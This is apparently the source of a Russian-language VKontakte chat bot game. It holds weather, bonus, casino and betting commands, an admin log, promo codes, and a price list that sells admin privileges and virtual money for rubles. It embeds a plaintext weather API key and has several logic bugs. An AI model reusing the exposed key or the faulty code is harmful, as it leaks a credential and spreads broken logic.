		k = b.length === 1 ? 0 : Math.floor(Math.min(b[1].slice(1), 14) / 3),
		c = k < 1 ? int.toFixed(0 + fixed) : (int / Math.pow(10, k * 3) ).toFixed(1 + fixed),
		d = c < 0 ? c : Math.abs(c),
		e = d + ['', ' тыс', ' млн', ' млрд', ' трлн'][k];

		e = e.replace(/e/g, '');
		e = e.replace(/\+/g, '');
		e = e.replace(/Infinity/g, ' Бесконечность');
		e = e.replace(/undefined/g, ' Бесконечность');
		e = e.replace(/NaN/g, ' Бесконечность');
		e = e.replace(/Nan/g, ' Бесконечность');
		e = e.replace(/Null/g, ' Бесконечность');
		e = e.replace(/null/g, ' Бесконечность');

		return e;
	},
	gi: (int) => {
		int = int.toString();

		let text = ``;
		for (let i = 0; i < int.length; i++)
		{
			text += `${int[i]}&#8419;`;
		}

		return text;
	},
	decl: (n, titles) => { return titles[(n % 10 === 1 && n % 100 !== 11) ? 0 : n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? 1 : 2] },
	random: (x, y) => {
		return y ? Math.round(Math.random() * (y - x)) + x : Math.round(Math.random() * x);
	},
	pick: (array) => {
		return array[utils.random(array.length - 1)];
	}
}




vk.updates.hear(/^(?:погода|weather)/i, async (message, bot) => { 
	let args = message.text.match(/^(?:погода|weather)\s?(.*)/i); 
	if(args[1].toLowerCase() == "") return message.send(nope) 
		rq("http://api.openweathermap.org/data/2.5/weather?q=" + encodeURIComponent(args[1]) + "&appid=fe198ba65970ed3877578f728f33e0f9&units=metric") 
	.then((res) => { 
		let Utils = { 
			filter: (text) => { 
				text = text.replace(/^(RU)/i, 'Россия') 
				text = text.replace(/^(UA)/i, 'Украина') 
				text = text.replace(/^(BY)/i, 'Беларусь') 
				text = text.replace(/^(KZ)/i, 'Казахстан') 
				text = text.replace(/^(AE)/i, 'Объединенные Арабские Эмираты') 
				return text; 
			}}; 
			function TempTo () { 
				if(res.main.temp < -10) return 'очень холодно' 
					else if(res.main.temp < -5) return 'холодно' 
						else if(res.main.temp < 5) return 'холодновато' 
							else if(res.main.temp < 20) return 'комфортно' 
								else if(res.main.temp < 25) return 'тепло' 
									else if(res.main.temp < 30) return 'жарко' 
										else if(res.main.temp < 50) return 'Очень жарко' 
									}; 
								function Timer () { 
									let now = new Date(res.dt*1000).getHours(); 
									if(now > 18) return '🌆' 
										else if(now > 22) return '🌃' 
											else if(now > 0) return '🌃' 
												else if(now < 6) return '🌅' 
													else if(now < 12) return '🏞' 
												}; 
											var sunrise = new Date(res.sys.sunrise*1000); 
											var sunset = new Date(res.sys.sunset*1000); 
											function sunmin () { 
												if(sunrise.getMinutes() < 10) "0" + sunrise.getMinutes(); 
												return sunset.getMinutes(); 
											}; 
											function sunsmin () { 
												if(sunset.getMinutes() < 10) "0" + sunset.getMinutes(); 
												return sunset.getMinutes(); 
											}; 
											function daterh () { 
												if(date.getHours() < 10) "0" + date.getHours(); 
												return date.getHours() 
											}; 
											function daterm () { 
												if(date.getMinutes() < 10) "0" + date.getMinutes(); 
												return date.getMinutes(); 
											}; 
											var date = new Date(res.dt*1000); 
											return message.reply(`${Timer()} ${res.name}, ${Utils.filter(res.sys.country)} 

												➖ Сейчас там ${TempTo()}: ${res.main.temp}°С 
												➖ Рассвет начинается с: ${sunrise.getHours()}:${sunmin()} 
												➖ Закат начинается с: ${sunset.getHours()}:${sunsmin()} 
												➖ Скорость ветра: ${res.wind.speed} м/с`)}) 
});


function getUnix() {
	return Date.now();
}
//--------------------------------\\
function unixStamp(stamp) {
	let date = new Date(stamp),
	year = date.getFullYear(),
	month = date.getMonth() + 1,
	day = date.getDate(),
	hour = date.getHours() < 10 ? "0"+date.getHours() : date.getHours(),
	mins = date.getMinutes() < 10 ? "0"+date.getMinutes() : date.getMinutes(),
	secs = date.getSeconds() < 10 ? "0"+date.getSeconds() : date.getSeconds();

	return `${day}.${month}.${year}, ${hour}:${mins}:${secs}`;
}
//--------------------------------\\
function unixStampLeft(stamp) {
	stamp = stamp / 1000;
	let s = stamp % 60;
	stamp = ( stamp - s ) / 60;
	let m = stamp % 60;
	stamp = ( stamp - m ) / 60;
	let h = ( stamp ) % 24;
	let d = ( stamp - h ) / 24;
	let text = ``;
	if(d > 0) text += Math.floor(d) + " дн ";
	if(h > 0) text += Math.floor(h) + " ч. ";
	if(m > 0) text += Math.floor(m) + " мин. ";
	if(s > 0) text += Math.floor(s) + " сек.";
	return text;
}




///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
vk.updates.hear(/^(?:бонус|🔑 Бонус)/i, (message) => { 
	let user = acc.users[user_id(message.user)]; 
let prize = [1,2,3].random(); // Рандомит приз 
let sid = 8484 // Стикер 

let bit = rand(500,10000); 
let reit = rand(1,25); 
let doll = rand(100000000,1000000000); 


if(user.act == false) return message.send(`Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`); // Проверка на регистрацию 
if(user.bloks_bonus > getUnix()) return message.send(` бонус можно получить через: ${unixStampLeft(user.bloks_bonus - Date.now())}`); // Лимит 

// Призы бонуса 
if(prize == 1){ 
	user.bitcoin += bit; 
	message.send(`На ваш баланс было зачислено ${spaces(bit)}฿`); 
	message.send({sticker_id: sid}); 
} 
if(prize == 2){ 
	user.global_exs += reit; 
	message.send(`На ваш баланс было зачислено ${spaces(reit)}👑!\n👑 Ваш Рейтинг: ${spaces(user.global_exs)}`); 
	message.send({sticker_id: sid}); 
} 
if(prize == 3){ 
	user.balance += doll; 
	message.send(`На ваш баланс было зачислено ${spaces(doll)}$!\n💳 Ваш Баланс: ${spaces(user.balance)}`); 
	message.send({sticker_id: sid}); 
} 
user.bloks_bonus = getUnix() + 86466000
}); 
//END

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
vk.updates.hear(/^(?:азино)\s?([^\s	].*)?/i, (message) => {
	if(!message.$match[1]) return message.send(`@id${user.id}(${user.prefix}), укажите ставку`);
	let amount = Number(message.$match[1]);
	message.$match[1] = message.$match[1].replace(/(\.|\,)/ig, '');
	message.$match[1] = message.$match[1].replace(/(к|k)/ig, '000');
	message.$match[1] = message.$match[1].replace(/(м|m)/ig, '000000');
	message.$match[1] = message.$match[1].replace(/(вабанк|вобанк|все|всё)/ig, user.balance);
	amount = Math.round(amount);  
	let id = user_id(message.user)
	let user = acc.users[user_id(message.user)];
	let text = '';
	if (amount > acc.users[id].balance || amount < 1 ) return message.send(`@id${user.id}(${user.prefix}), cтавка не может превышать баланс или быть ниже 1$`);
	if(acc.users[id].balance > 20000000){
		if(rand(1,100) <= 30){

			user.game.kazwin += 1;
			user.balance -= amount;
			let sum = amount * 2; 
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.balance += sum;
			game_log(user_id(message.user), 'казино', amount, 1)
			
			if(amount >= 11111111111111111111111111111111111111111111110000){

				user.exs += 2;
				let up = lvlup(id);
				if(up == true){
					return message.send(`${text} @id${user.id}(${user.prefix}), вы выиграли ${spaces(sum)}$ (х${mnojitel}) и ${a} опыта!\n💰 Баланс: ${spaces(user.balance)}$\n🌟 Ваш Уровень повышен!`);
				}else{
					return message.send(`${text} @id${user.id}(${user.prefix}), вы выиграли ${spaces(sum)}$ и ${a} опыта`);
				}
			}else{
				return message.send(`${text} @id${user.id}(${user.prefix}), вы выиграли ${spaces(sum)}$\n🍀 ➾ Опыт дается при ставке от 10.000$`);
			}

		}else{
			game_log(user_id(message.user), 'казино', amount, 0)
			user.game.kazlose += 1;
			user.balance -= amount;
			return message.send(`@id${user.id}(${user.prefix}), вы проиграли ${amount}$\n💰 Баланс: ${spaces(user.balance)}$`);
		}
	}else{	
		if(rand(1,100) <= 20){

			user.game.kazwin += 1;
			user.balance -= amount;
			let sum = amount * 2; 
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.balance += sum;
			
			if(amount >= 1000111111111111111111111111111111111111111111111111111111111111111111110){
				game_log(user_id(message.user), 'казино', amount, 1)

				user.exs += 2;
				let up = lvlup(id);
				if(up == true){
					return message.send(`${text} @id${user.id}(${user.prefix}), вы выиграли ${spaces(sum)}$ (х${mnojitel}) и ${a} опыта!\n💰 Баланс: ${spaces(user.balance)}$\n🌟 Ваш Уровень повышен!`);
				}else{
					return message.send(`${text} @id${user.id}(${user.prefix}), вы выиграли ${spaces(sum)}$ (х${mnojitel}) и ${a} опыта!\n💰 Баланс: ${spaces(user.balance)}$`);
				}
			}else{
				return message.send(`${text} @id${user.id}(${user.prefix}), вы выиграли ${spaces(sum)}$\n🍀 ➾ Опыт дается при ставке от 10.000$`);
			}

		}else{
			game_log(user_id(message.user), 'казино', amount, 0)
			user.game.kazlose += 1;
			user.balance -= amount;
			return message.send(`@id${user.id}(${user.prefix}), вы проиграли ${amount}$\n💰 Баланс: ${spaces(user.balance)}$`);
		}
	}
});


vk.updates.hear(/^(?:ааазино)\s?([^\s	].*)?/i, (message) => {
	message.$match[1] = message.$match[1].replace(/(к|k)/ig, '000');
	message.$match[1] = message.$match[1].replace(/(м|m)/ig, '000000');
	message.$match[1] = message.$match[1].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);

	if(!Number(message.$match[1])) return;
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let text = '';
	message.$match[1] = Math.floor(Number(message.$match[1]));
	if(message.$match[1] <= 0) return;

	if(message.$match[1] > acc.users[id].balance) return message.send(`у вас нет данной суммы`);
	else if(message.$match[1] <= acc.users[id].balance)
	{
		acc.users[id].balance -= message.$match[1];
		const multiply = utils.pick([2, 0.75, 0.75, 0, 2, 0.75, 0.75, 2, 0.5, 0.5, 0, 0.5, 2, 2, 0.5, 0.50, 2, 0, 0.75, 2, 1, 1, 1, 1, 0.5, 1, 2, 2, 2, 1, 1, 2, 1, 1, 2, 2, 0.75, 5, 2, 0, 1, 0, 0.5, 2, 0.5, 0.5, 6, 2, 2, 0, 2, 1, 1, 1, 1, 0.5, 0.5, 3]);

		acc.users[id].balance += Math.floor(message.$match[1] * multiply);
		return message.match(`${multiply === 1 ? `ваши деньги остаются при вас` : `${multiply < 1 ? `вы проиграли ${utils.sp(message.args[1] * multiply)}$` : `вы выиграли ${utils.sp(message.args[1] * multiply)}$`}`} (x${multiply})
			💰 Баланс: ${acc.users[id].balance}$`);
	}
});

vk.updates.hear(/^(?:казино|азино)\s?([^\s  ].*)?/i, (message) => {
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(user.act == false) return message.send(`${rnick}, Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	let amount = Number(parserInt(message.$match[1]));
	amount = Math.round(amount);   
	if(!message.$match[1]) return message.send(`${rnick}, используйте: «казино [ставка]» 😒`);

	if(user.ap < 1){
		if(amount > 100000000000000000 && amount != user.balance) return
			if(amount > 10000000000000 || amount < 1) return message.send(` ${rnick}, ставка не может превышать более - 10.000.000.000.000`)
		}
	if(amount < 1) return message.send(`🔸 ${rnick}, ставка должна быть не менее 1$`)
		if(amount > user.balance) {
			return message.send(`${rnick}, недостаточно денег 😒\n 💰 Баланс: ${spaces(user.balance)}`)
		}
		if(message.$match[1].toLowerCase() == 'все' || message.$match[1].toLowerCase() == 'всё' || message.$match[1].toLowerCase() == 'вабанк' || message.$match[1].toLowerCase() == 'вобанк'){ 
			if(user.balance < 1 ) return message.send(`${rnick}, недостаточно денег 😒\n 💰 Баланс: ${spaces(user.balance)}`)
				amount = user.balance; 
		}else{ 
			let amount = parserInt(message.$match[1]); 
		}
		if(!Number(amount)) return message.send(`${rnick}, ставка должна быть цифрового вида.`);
		let mnojitelwin = [2,3].random();
		let mnojitellose = [0.95,0.75,0.25,1].random();
		let smilelose = ['😩','😕','😦','😵','😟','😔','😩','😿'].random();
		let smilewin = ['😄','😁','😊','😃','😉','😜','😋','🤗','🙂','🙃','😌','🤤','😇','🤪','😈','😸','😼','😺','😎'].random();
		if(rand(1,100) < 23){
			let balance = amount;
			let win_balance = amount * mnojitelwin;
			win_balance = Math.round(win_balance);
			user.balance += Number(win_balance) 
			return message.send(`${rnick}, вы выиграли ${spaces(win_balance)}$ (х${mnojitelwin}) ${smilewin}\n💰 Баланс: ${spaces(user.balance)}$`); 
		}else{
			let balance = amount;
			let lose_balance = amount * mnojitellose;
			lose_balance = Math.round(lose_balance);
			user.balance -= Number(lose_balance) 
			return message.send(`${rnick}, вы проиграли ${spaces(lose_balance)}$ (х${mnojitellose}) ${smilelose}\n💰 Баланс: ${spaces(user.balance)}$`);
		}
	});
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
vk.updates.hear(/^(?:акция)?\s([^\s].*)?\s(.*)/i, message => {
	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: акция [вверх/вниз] [ставка]`)
		let amount = parserInt(message.$match[2]);   
	let user = acc.users[user_id(message.user)]; 
	let id = user_id(message.user) 
	if (amount > acc.users[id].balance || amount < 1) return message.send(`🎉 ➾  Ставка не может превышать баланс или быть ниже 1$`);
	if(!Number(amount)) return message.send(`🔸 ➾ Ставка должна быть числом!`); 

	if(message.$match[1] == 'вверх'){
		if(rand(1,2) == 1){ 
			user.balance -= amount;
			let sum = amount * 2;
			let text = ''
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.balance += sum;
			user.game.binwin += 1; 
			game_log(user_id(message.user), 'акция', amount, 1)
			if(amount < 10000000000000000000000){ 
				user.exs += 2;
				let up = lvlup(user_id(message.user));
				if(up == true){
					return message.reply(`${text}📈 ➾  Курс акций вырос на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`${text}📈 ➾  Курс акций вырос на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!`);
				}
			}else{
				return message.reply(`${text}📈 ➾  Курс акций вырос на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$\n🍀 ➾ Опыт дается при ставке от 10.000$`);
			}

		}else{ 
			game_log(user_id(message.user), 'акция', amount, 0)
			user.game.binlose += 1;
			user.balance -= amount;
			return message.reply(`📈 ➾  Курс акций упал на - ${rand(1,100)}%\n🌚 ➾ Вы проиграли ${spaces(amount)}$!`);
		}
	}
	if(message.$match[1] == 'вниз'){ 
		if(rand(1,2) == 1){
			let i = games(type='вниз');
			user.balance -= amount;
			let sum = amount * 2;
			let text = ''
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.balance += sum; 
			user.game.binwin += 1;
			game_log(user_id(message.user), 'акция', amount, 1)
			if(amount < 10000000000000000000000){
				user.exs += 2;
				let up = lvlup(user_id(message.user));
				if(up == true){
					return message.reply(`${text}📈 ➾  Курс акций упал на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`${text}📈 ➾  Курс акций упал на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!`);
				}
			}else{
				return message.reply(`${text}📈 ➾ Курс акций упал на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!\n🍀 ➾ Опыт дается при ставке от 10.000$`);	
			}


		}else{ 
			game_log(user_id(message.user), 'акция', amount, 0)
			user.game.binlose += 1;
			user.balance -= amount;
			return message.reply(`📈 ➾ Курс акций вырос на - ${rand(1,100)}%\n🌚 ➾ Вы проиграли ${spaces(amount)}$!`);
		}
	} 
});

vk.updates.hear(/^(?:ставка)\s?([^]+)?\s([^\s	].*)/i,  message => {
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: ставка [выше/ниже] [ставка]`)
		let amount = parserInt(message.$match[2]);   
	amount = Math.round(amount);  
	let id = user_id(message.user) 
	if(!Number(amount)) return message.send(`🔸 ➾ Ставка должна быть числом!`);
	let user = acc.users[user_id(message.user)]; 
	if (amount > acc.users[id].balance || amount < 1) return message.send(`🔸 ➾  Ставка не может превышать баланс или быть ниже 1$`);  
	if(message.$match[1].toLowerCase() == 'выше'){
		if(rand(1,2) == 1){ 

			user.balance -= amount;
			user.balance += amount * 2;
			user.game.stavka_win += 1; 
			game_log(user_id(message.user), 'ставка', amount, 1)
			if(amount < 10000000000000000000000	){
				user.exs += 2;
				let up = lvlup(user_id(message.user)); 
				if(up == true){
					return message.reply(`🔸 ➾ Число [${rand(500000,999999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`🔸 ➾ Число [${rand(500000,999999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта!`);
				}
			}else{
				return message.reply(`🔸 ➾ Число [${rand(500000,999999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта!\n🍀 ➾ Опыт дается при ставке от 10.000$`);
			} 
		}else{ 
			game_log(user_id(message.user), 'ставка', amount, 0) 
			user.game.stavka_lose += 1;
			user.balance -= amount;
			return message.reply(`🔸 ➾ Число [${rand(1,499999)}]\n🔸 ➾ Вы проиграли ${spaces(amount)}$!`);
		}
	}
	if(message.$match[1].toLowerCase() == 'ниже'){ 
		if(rand(1,2) == 1){ 
			user.balance -= amount;
			user.balance += amount * 2;
			user.game.stavka_win += 1;  
			game_log(user_id(message.user), 'ставка', amount, 1)
			if(amount < 10000000000000000000000){
				user.exs += 2;
				let up = lvlup(user_id(message.user)); 
				if(up == true){
					return message.reply(`🔸 ➾ Число [${rand(1,499999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`🔸 ➾ Число [${rand(1,499999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта!`);
				}
			}else{
				return message.reply(`🔸 ➾ Число [${rand(1,499999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта!\n🍀 ➾ Опыт дается при ставке от 10.000$`);
			}  
		}else{ 
			game_log(user_id(message.user), 'ставка', amount, 0)
			user.game.stavka_lose += 1;
			user.balance -= amount;
			return message.reply(`🔸 ➾ Число [${rand(500000,999999)}]\n🔸 ➾ Вы проиграли ${spaces(amount)}$!`);
		}
	} 
});

vk.updates.hear(/^(?:рандом)\s?([0-9]+)?\s([^\s	].*)/i, message => {
	let i = parserInt(message.$match[2]); 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !message.$match[2] || !Number(i)|| !Number(message.$match[1]) || message.$match[1] > 60 ) return message.send(`🎲 ➾ Пример ввода: 'Рандом [1-60] [СТАВКА]\n🎲 ➾ [1-60] - это шанс(от него зависит сумма выплаты).'`);
	let p = Number(message.$match[1])
	let amount = p;
	amount = Math.round(amount);  
	if(!Number(message.$match[1])) return message.send(`🎲 ➾ Пример ввода: 'Рандом [1-60] [СТАВКА]\n🎲 ➾ [1-60] - это шанс(от него зависит сумма выплаты).'`);
	if (i > user.balance || i <= 0) return message.send(`🔸 ➾  Ставка не может превышать баланс или быть отрицательной`);  
	if(p >= 40){
		if(rand(1,130) <= p){ 
			game_log(user_id(message.user), 'рандом', amount, 1)
			i = i / 100 * 30 + i 

			user.exs += 2;
			user.game.rand_win += 1;
			let up = lvlup(user_id(message.user));
			user.balance += Math.round(i);
			if(up == true){
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И получили +2 опыта\n🌟 ➾ [Уровень повышен]`);
			}else{
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И получили +2 опыта`);
			}  
		}else{ 
			game_log(user_id(message.user), 'рандом', amount, 0)
			user.game.rand_lose += 1;
			user.balance -= Number(i); 
			return message.send(`🎲 ➾ Вы проиграли [${Math.round(i)}]$`);
		} 
	} 
	if(p >= 20 && p < 40){
		if(rand(1,100) <= p){
			i = i / 100 * 20 + i 
			game_log(user_id(message.user), 'рандом', amount, 1)

			user.exs += 2;
			user.game.rand_win += 1;
			let up = lvlup(user_id(message.user)); 

			user.balance += Math.round(i);
			if(up == true){
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И получили +2 опыта\n🌟 ➾ [Уровень повышен]`);
			}else{
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И получили +2 опыта`);
			}  
		}else{
			user.balance -= Number(i); 
			game_log(user_id(message.user), 'рандом', amount, 0)  
			user.game.rand_lose += 1;
			return message.send(`🎲 ➾ Вы проиграли [${Math.round(i)}]$`);
		} 
	} 

	if(p >= 1 && p < 20){
		if(rand(1,100) <= p){
			i = i / 100 * 70 + i 
			game_log(user_id(message.user), 'рандом', amount, 1)

			user.exs += 2;
			user.game.rand_win += 1;
			let up = lvlup(user_id(message.user)); 

			user.balance += Math.round(i);
			if(up == true){
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И полочили +2 опыта\n🌟 ➾ [Уровень повышен]`);
			}else{
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И полочили +2 опыта`);
			}  
		}else{
			user.balance -= Number(i); 
			game_log(user_id(message.user), 'рандом', amount, 0) 
			user.game.rand_lose += 1;
			return message.send(`🎲 ➾ Вы проиграли [${i}]$`);
		} 
	} 

	user.balance -= Number(message.$match[2]); 
	user.game.rand_lose += 1;
	return message.send(`🎲 ➾ Вы проиграли [${message.$match[1]}]$`);
});


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


vk.updates.hear(/^(?:log)\s?([0-9]+)?\s?([0-9]+)?/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.level < 5) return;

	if(!message.$match[2]) return message.send(`Уважаемый @id${user.id} (Основатель), вы попали в систему [ADMIN LOG]\n Для того что бы её использовать введите: LOG [ID] [Номер зрапроса] - -\n1. Передачи [передать (ID)]\n2. Выдачи [giv (ID)]\n3. Обнуления баланса [remmon (ID)]\n4. Выдача прав [setadmin (ID)]\n5. Обнуление прав [Delladmin (ID)]\n6. Варны [warn (ID)]`) 
		let id = message.$match[1];
	let i = message.$match[2];
	if(i < 0 || i > 5) return message.send(`Ошибка, Доступ закрыт.`);
	let text = '';
	if(i == 1) for(i=0; i!=log.point[id].log.length; i++){text += log.point[id].log[i];}
	if(i == 2) for(i=0; i!=log.give[id].log.length; i++){text += log.give[id].log[i];}
	if(i == 3) for(i=0; i!=log.remove[id].log.length; i++){text += log.remove[id].log[i];} 
	if(i == 4) for(i=0; i!=log.admin[id].log.length; i++){text += log.admin[id].log[i];} 
	if(i == 5) for(i=0; i!=log.setwin[id].log.length; i++){text += log.setwin[id].log[i];}  
	if(i == 6) for(i=0; i!=log.warns[id].log.length; i++){text += log.warns[id].log[i];}  
	return message.send(text);
});

vk.updates.hear(/^(?:лог)/i, (message) => {
	let id = user_id(message.user);

	let text = '⛔ Лог последних 15 игр ⛔\n';
	for(i=0; i!=log.game[id].log.length; i++){text += log.game[id].log[i];} 
		return message.send(text);
});
 //Донат
 vk.updates.hear(/^(?:донат)/i,  message => {
 	let user = acc.users[user_id(message.user)];
 	return message.send(`	
 		💳Донат услуги проекта @bot.anya (Бот Анна)💳

 		❤ >> Сердец ${user.rub}
 		💳 >> Донат счёт: ${user.rub}₽
 		🔑 >> Ключей от кейсов: ${user.keys}



 		❤ >> Покупка сердец: 2 за 1₽.
 		[Обмен сердец на $]
 		💳 >> 'Трейд [Число]' || 'Курс'


 		⚠[Доступ]⚠
 		🔹 >> VIP[1]
 		🔻 Срок: Навсегда >> 110₽. -- Для покупки: [Купить VIP]

 		🔹 >> Уровень доступа: Модератор[2]
 		🔻 Срок: Навсегда >> 250₽. -- Для покупки: [Купить Mod]

 		🔹 >> Уровень доступа: Администратор[3]
 		🔻 Срок: Навсегда >> 470₽. -- Для покупки: [Купить Admin]

 		🔹 >> Уровень Доступа: Главный Администратор[4]
 		🔻 Срок: Навсегда >> 690₽. -- Для покупки: [Купить GLADM]

 		🔹 >> Уровень Доступа: Основатель[5]
 		🔻 Срок: Навсегда >> 3000₽. -- Покупка у @id287908009 (Основателя)

 		🔹 >> Уровень Доступа: Full-Dostup
 		🔻 Срок: Навсегда >> 5000₽.  -- Покупка у @id287908009 (Основателя)

 		[Валюта]
 		💵 >> 100.000.000$ - 10 ₽.
 		💵 >> 600.000.000$ - 50 ₽.
 		💵 >> 1.500.000.000$ - 100 ₽.


 		[Прочее]
 		🔸 >> Снять 'Временную Блокировку' >> 30 рублей.
 		🔸 >> Разбан аккаунта >> 100 рублей.
 		✅ >> Подтверждённый аккаунт - 25 рублей.
 		😈 >> Префикс (на профиль) - 20 рублей.	


 		[Бизнес/Работы]
 		📋 >> Услуги автоматического сбора:
 		👒 >> 'Авто-сбор зарплат' | 50р | 24 раза
 		👒 >> 'Авто-сбор прибыли' | 50р | 24 раза
 		🔹 >> Смена названия имущества -- 80 Рублей
 		🔹 >> Длинный ник -- 75 Рублей


 		[Кейсы]
 		📋 > Информация по преобретению кейсов:
 		📋 > Команда: "Кейс"

 		[Преобретать строго у разработчика]
 		`)
 });
 
 
 vk.updates.hear(/^курс/i,  (message) => {  
 	return message.send(`
 		📊 >> Актуальный курс обмена сердец << 📊
 		🔸 Продажа: ${acc.curs}$
 		📶 'Трейд [Число]'


 		💰 >> Актуальный курс обмена Биткоинов << 💰
 		🔸 Продажа: ${acc.bit}$
 		📶 'Биткоин продать [Число]'
 		`);
 });

 vk.updates.hear(/^(?:трейд)\s?([0-9]+)?/i,  (message) => {
 	let user = acc.users[user_id(message.user)];
 	if(!message.$match[1]) return message.send(`@id${user.id}(${user.prefix}), Введите количество сердец для обмена`);
 	if(user.donate < message.$match[1]) return message.send(`@id${user.id}(${user.prefix}), У вас нет столько сердец`);
 	user.donate -= Number(message.$match[1]);
 	user.balance += Number(message.$match[1] * acc.curs)
 	return message.send(`@id${user.id}(${user.prefix}), Вы обменяли [${message.$match[1]}] сердец на [${message.$match[1] * acc.curs}]$`);
 });

//////////////////////////////////////////////////////// промики

vk.updates.hear(/^(?:активировать)\s?([^]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`@id${user.id}(${user.prefix}), вы не указали Промо-Код!\n -- Пример Команды: Активировать [Промо-Код]`);
	if(!acc.promos[message.$match[1]]) return message.send(`@id${user.id}(${user.prefix}), Такого Промо-Кода нету или закончились активации!`);
	if(acc.promos[message.$match[1]].users[message.user]) return message.send(`@id${user.id}(${user.prefix}), Вы уже активировали этот Промо-Код!`);
	acc.promos[message.$match[1]].users[message.user] = {i: true};
	acc.promos[message.$match[1]].activ -= 1;
	if(acc.promos[message.$match[1]].type == 1){
		user.balance += Number(acc.promos[message.$match[1]].balance); 
		message.send(`@id${user.id}(${user.prefix}), вы успешно активировали Промо-Код [${message.$match[1]}]`)
		message.send(`Вы получили: ${acc.promos[message.$match[1]].balance}$ \n📛 Активаций осталось: ${acc.promos[message.$match[1]].activ}/15`);
		message.send({sticker_id:4641})
	}
	if(acc.promos.type == 2){
		user.donate += Number(acc.promos[message.$match[1]].balance); 
		message.send(`@id${user.id}(${user.prefix}), вы успешно активировали Промо-Код [${message.$match[1]}]`)
		message.send(`Вы получили: ${acc.promos[message.$match[1]].balance}$ \n📛 Активаций осталось: ${acc.promos[message.$match[1]].activ}/15`);
		message.send({sticker_id:4641})
	}

	if(acc.promos[message.$match[1]].activ == 0) delete acc.promos[message.$match[1]];
	return 
});


vk.updates.hear(/^(?:setpromo)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.full == false) return;
	if(!message.$match[1]) return message.send(`@id${user.id}(${user.prefix}), Ошибка, вы не указали сумму Промо-Кода\n -- Пример Команды: SetPromo [Сумма Промо-Кода]`);  

	var result  = '';
	let words  = '0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
	let max_position = words.length - 1;
	for( i = 0; i < 6; ++i ) {
		position = Math.floor ( Math.random() * max_position );
		result = result + words.substring(position, position + 1);
	}

	acc.promos[result] = {
		users: {},
		activ: 15,
		type: 1,
		balance: message.$match[1]
	}		

	message.send(`🔔 Уважаемые игроки @bot.anya (Бота Анна)!\n В ${time()} по МСК @id${user.id} (Основатель) cоздал Промо-Код: ${result}\n 🔎 Количество активаций: 15.`)
	message.send(`💌 После активации вы получите: ${message.$match[1]}$ на свой баланс.`)
	message.send(`📌 Команда для активации Промо-Кода: "Активировать ${result}"`)
	message.send({attachment:`audio449532928_456239408`})
	message.send({sticker_id:4642})
});

 //////////// full dostup - - - - - - 

